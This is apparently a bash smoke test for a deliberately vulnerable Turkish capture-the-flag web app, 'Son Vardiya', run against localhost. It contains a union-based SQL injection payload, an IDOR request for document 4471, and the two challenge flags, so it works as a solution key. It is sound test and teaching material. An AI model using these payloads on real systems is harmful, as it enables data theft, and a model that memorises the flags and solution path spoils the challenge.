#!/usr/bin/env bash
# Son Vardiya - uçtan uca smoke test
# Kullanım: docker compose up --build -d && bash tests/smoke_test.sh
set -uo pipefail

BASE_URL="${BASE_URL:-http://127.0.0.1:5001}"
COOKIE_JAR="$(mktemp)"
FAIL=0

pass() { echo "  ✓ $1"; }
fail() { echo "  ✗ $1"; FAIL=1; }

echo "== Son Vardiya smoke test ($BASE_URL) =="

# 1) Giriş
echo "[1/6] Giriş (elif.demir / elif123)"
LOGIN_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -c "$COOKIE_JAR" \
    -X POST "$BASE_URL/login" -d "username=elif.demir&password=elif123")
if [ "$LOGIN_STATUS" = "302" ]; then pass "Giriş başarılı (302 redirect)"; else fail "Giriş başarısız (HTTP $LOGIN_STATUS)"; fi

# 2) Portal erişilebiliyor mu
echo "[2/6] Portal sayfası"
PORTAL=$(curl -s -b "$COOKIE_JAR" "$BASE_URL/portal")
echo "$PORTAL" | grep -q "Hoş geldin" && pass "Portal render edildi" || fail "Portal beklenen içeriği döndürmedi"

# 3) SQL Injection -> Flag 1 + 4471 ipucu
echo "[3/6] Union-based SQL Injection (/search)"
SQLI_PAYLOAD="' UNION SELECT id, note, role FROM employees WHERE id=1--"
SEARCH=$(curl -s -b "$COOKIE_JAR" -G "$BASE_URL/search" --data-urlencode "name=$SQLI_PAYLOAD")
if echo "$SEARCH" | grep -q "TUGA{sqli_personel_arsivi}"; then pass "Flag 1 SQLi ile elde edildi"; else fail "Flag 1 bulunamadı"; fi
if echo "$SEARCH" | grep -q "4471"; then pass "4471 ipucu sonuçlarda mevcut"; else fail "4471 ipucu bulunamadı"; fi

# 4) IDOR -> doküman 4471 (CCTV kaydı)
echo "[4/6] IDOR (/documents/view?id=4471)"
DOC=$(curl -s -b "$COOKIE_JAR" "$BASE_URL/documents/view?id=4471")
echo "$DOC" | grep -q "cctv_4471.jpg" && pass "IDOR ile 4471 dokümanına erişildi (CCTV görseli mevcut)" || fail "4471 dokümanına erişilemedi"

# 5) Kısıtlı arşiv -> Flag 2
echo "[5/6] Kısıtlı arşiv kaydı (/archive/4471-B)"
ARCHIVE=$(curl -s -b "$COOKIE_JAR" "$BASE_URL/archive/4471-B")
echo "$ARCHIVE" | grep -q "TUGA{son_vardiyanin_sirri}" && pass "Flag 2 kısıtlı arşiv kaydından elde edildi" || fail "Flag 2 bulunamadı"

# 6) Archive brute-force koruması: 4471-A..4471-Z denemesi flag'i açığa çıkarmamalı
#    ve hızlı ardışık farklı-kod denemeleri 429 ile yavaşlatılmalı.
echo "[6/6] Archive brute-force direnci ve rate limit"
LEAK=0
BLOCKED_SEEN=0
for L in A C D E F G H I J K L M N O P Q R S T U V W X Y Z; do
    CODE_STATUS=$(curl -s -o /tmp/_archive_resp.txt -w "%{http_code}" -b "$COOKIE_JAR" "$BASE_URL/archive/4471-$L")
    grep -q "TUGA{son_vardiyanin_sirri}" /tmp/_archive_resp.txt && LEAK=1
    [ "$CODE_STATUS" = "429" ] && BLOCKED_SEEN=1
done
rm -f /tmp/_archive_resp.txt
if [ "$LEAK" -eq 0 ]; then pass "Yanlış kodlar (4471-A..Z) flag'i sızdırmadı"; else fail "Yanlış bir kod flag'i sızdırdı!"; fi
if [ "$BLOCKED_SEEN" -eq 1 ]; then pass "Hızlı ardışık denemelerde rate limit (429) devreye girdi"; else fail "Rate limit hiç tetiklenmedi (beklenmiyordu)"; fi

rm -f "$COOKIE_JAR"

echo "=========================="
if [ "$FAIL" -eq 0 ]; then
    echo "TÜM ADIMLAR BAŞARILI ✓"
    exit 0
else
    echo "BAZI ADIMLAR BAŞARISIZ ✗"
    exit 1
fi
